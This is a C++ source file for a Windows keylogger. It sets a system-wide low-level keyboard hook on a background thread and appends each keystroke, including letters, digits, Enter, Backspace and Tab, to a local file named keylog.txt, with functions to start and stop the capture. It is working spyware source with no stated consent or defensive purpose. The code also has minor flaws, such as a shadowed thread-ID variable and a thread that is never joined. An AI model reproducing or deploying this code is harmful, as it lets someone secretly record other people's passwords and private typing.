#include "keylogger.h"
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <thread>
#include <atomic>
#include <mutex>

std::atomic<bool> isRunning(false);
std::mutex fileMutex;

HHOOK hKeyboardHook = NULL;
DWORD hookThreadId = 0;

void logKey(DWORD vkCode)
{
    std::lock_guard<std::mutex> lock(fileMutex);
    std::ofstream logFile("keylog.txt", std::ios::app);
    if (!logFile.is_open())
    {
        std::cerr << "Failed to open keylogger log file." << std::endl;
        return;
    }
    if ((vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A)) // Digits && Letters
    {
        logFile << static_cast<char>(vkCode);
    }
    else if (vkCode == VK_SPACE)
    {
        logFile << ' ';
    }
    else if (vkCode == VK_RETURN)
    {
        logFile << '\n';
    }
    else if (vkCode == VK_BACK)
    {
        logFile << "[BACKSPACE]";
    }
    else if (vkCode == VK_TAB)
    {
        logFile << "[TAB]";
    }
    else
    {
        logFile << "[" << vkCode << "]";
    }
    logFile.close();
    std::cout << "Logged key: " << vkCode << std::endl;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        logKey(kbd->vkCode);
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void runHook()
{
    hookThreadId = GetCurrentThreadId();
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hKeyboardHook == NULL)
    {
        std::cerr << "Failed to set keyboard hook." << std::endl;
        isRunning = false;
        return;
    }
    MSG msg;
    while (isRunning.load())
    {
        if (GetMessage(&msg, NULL, 0, 0) == -1)
        {
            std::cerr << "GetMessage failed." << std::endl;
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hKeyboardHook);
    hKeyboardHook = NULL;
    std::cout << "Keylogger stopped." << std::endl;
    isRunning = false;
}

void startKeylogger()
{
    if (isRunning.load())
    {
        std::cout << "Keylogger is already running." << std::endl;
        return;
    }
    isRunning = true;
    std::cout << "Starting keylogger..." << std::endl;
    static std::thread hookThread;
    static DWORD hookThreadId = 0;
    hookThread = std::thread([&]()
                             {
        hookThreadId = GetCurrentThreadId();
        runHook(); });
}

void stopKeylogger()
{
    if (!isRunning.load())
    {
        std::cout << "Keylogger is not running." << std::endl;
        return;
    }
    isRunning = false;
    std::cout << "Stopping keylogger..." << std::endl;
    extern DWORD hookThreadId;
    if (hookThreadId != 0)
    {
        PostThreadMessage(hookThreadId, WM_QUIT, 0, 0);
    }
    {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
    }
    // Removed invalid PostThreadMessage(HWND_BROADCAST, WM_QUIT, 0, 0);
    if (hKeyboardHook != NULL)
    {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
    }
}